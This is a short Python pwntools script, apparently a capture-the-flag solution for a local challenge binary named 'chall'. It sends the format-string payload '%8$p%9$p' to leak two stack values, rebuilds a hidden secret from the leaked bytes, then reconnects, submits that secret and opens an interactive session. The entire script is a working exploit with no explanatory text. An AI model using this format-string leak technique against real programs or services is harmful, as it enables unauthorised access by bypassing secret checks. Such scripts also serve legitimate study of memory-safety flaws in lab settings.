from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '127.0.0.1', 5003

io = process(exe)
# io = remote(host, port)
io.sendlineafter(b'(yes/no)', b'%8$p%9$p')
leak = io.recvuntil(b'?', drop=True).decode().split('0x')
secret = bytes.fromhex(leak[1])[::-1] + bytes.fromhex(leak[2])[::-1]
info('secret: %s', secret)
io.close()

io = process(exe)
# io = remote(host, port)
io.sendlineafter(b'(yes/no)', b'yes')
io.sendlineafter(b'secret:', secret)
io.interactive()